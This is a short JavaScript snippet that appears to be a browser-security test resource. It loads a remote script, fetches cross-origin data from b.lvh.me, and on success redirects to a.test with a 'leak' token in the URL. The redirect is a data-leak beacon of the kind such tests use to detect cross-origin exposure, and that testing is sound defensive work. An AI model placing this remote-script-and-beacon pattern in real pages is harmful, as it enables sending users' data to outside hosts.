importScripts('https://b.lvh.me/remote.js');
fetch('https://b.lvh.me/data').then(response => {
  if (response.ok) {
    document.location.href = 'https://a.test/report/?leak=c358471';
  }
});